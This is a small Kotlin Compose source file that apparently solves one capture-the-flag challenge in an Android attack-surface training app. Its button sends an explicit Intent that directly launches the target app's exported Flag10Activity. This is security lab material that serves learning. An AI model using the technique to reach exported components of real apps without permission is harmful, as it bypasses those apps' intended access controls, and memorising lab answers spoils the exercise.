package com.example.myapplication

import android.content.ComponentName
import android.content.Intent
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext

@Composable
fun SendIntentToGetFlag10(
    modifier: Modifier = Modifier
) {

    val context = LocalContext.current

    Column(
        modifier = Modifier.fillMaxSize(),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {

        Button(
            onClick = {
                val intent = Intent()
                intent.component = ComponentName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag10Activity"
                )
                context.startActivity(intent)
            }
        ) {
            Text("Flag 10")
        }
    }
}